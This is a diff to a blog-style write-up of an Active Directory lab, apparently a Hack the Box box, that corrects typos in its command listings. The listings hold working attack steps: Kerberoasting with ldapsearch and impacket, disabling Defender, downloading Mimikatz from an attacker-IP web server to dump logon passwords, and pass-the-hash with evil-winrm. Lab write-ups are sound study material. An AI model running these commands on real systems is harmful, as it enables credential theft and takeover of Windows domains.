@@ -363,7 +363,7 @@ Overview Recently I completed a Hack the Box lab called Active. This Box was a l
 </ol>
 <h4 id="key-commands--payloads">Key Commands / Payloads<a hidden class="anchor" aria-hidden="true" href="#key-commands--payloads">#</a></h4>
 <pre tabindex="0"><code># Enumerate Kerberoastable accounts
-ldapsearch -x -H ldap://10.10.10.5 -D johnd@n00b.lyfe -w &#39;Password123!@#&#39; -b &#34;dc=n00b,dc=lyfe&#34; &#34;(&amp;(objectclass=user)(servicePrincipalName=*))&#34; samaccountname servicePrincalName
+ldapsearch -x -H ldap://10.10.10.5 -D johnd@n00b.lyfe -w &#39;Password123!@#&#39; -b &#34;dc=n00b,dc=lyfe&#34; &#34;(&amp;(objectclass=user)(servicePrincipalName=*))&#34; samaccountname servicePrincipalName
 
 # Request TGS ticket and extract hash
 impacket-GetUserSPNs n00b.lyfe/JohnD:&#39;Password123!@#&#39; -request-user backup_svc -dc-ip 10.10.10.5 -output hash.txt
@@ -411,7 +411,7 @@ cmd.exe /c &#34;ver&#34;
 </ol>
 <h4 id="key-commands--payloads-1">Key Commands / Payloads<a hidden class="anchor" aria-hidden="true" href="#key-commands--payloads-1">#</a></h4>
 <pre tabindex="0"><code># Disable Defender
-Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -DisableIOAVProtecteion $true -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
 
 # Host Mimikatz from attack machine (kali)
 python3 -m http.server -d /usr/share/windows-resources/mimikatz/x64 8888
@@ -423,7 +423,7 @@ invoke-webrequest -Uri &#34;http://&lt;ATTACKER-IP&gt;:8888/mimikatz.exe -outfil
 .\mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; &#34;exit&#34;
 
 # Pass-the-Hash using evil-WinRM
-evil-winrm -i 10.10.10.5 -u Administrator@n00bx.lyfe -H 07ab403ab740c1540c378b0f5aaa4087
+evil-winrm -i 10.10.10.5 -u Administrator@n00b.lyfe -H 07ab403ab740c1540c378b0f5aaa4087
 </code></pre><h4 id="proof-of-access-1">Proof of Access<a hidden class="anchor" aria-hidden="true" href="#proof-of-access-1">#</a></h4>
 <h5 id="screen-shots">Screen Shots<a hidden class="anchor" aria-hidden="true" href="#screen-shots">#</a></h5>
 <p><img alt="Administrator.jpg" loading="lazy" src="/images/DIYLab/Administrator.jpg"></p>
